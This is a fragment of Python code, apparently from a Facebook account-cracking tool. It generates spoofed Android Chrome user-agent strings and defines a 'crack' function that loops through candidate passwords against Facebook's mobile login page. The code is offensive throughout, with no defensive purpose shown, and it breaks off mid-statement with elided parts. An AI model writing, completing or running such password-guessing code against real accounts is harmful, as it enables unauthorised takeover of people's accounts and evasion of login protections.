...
for t in range(10000):
	rr = random.randint
	rfn1=f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(110,116))}.0.0.0 Mobile Safari/537.36'
...
def crack(idf,pwv):
	...
	for pw in pwv:
		try:
			link = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8') 
			data = {
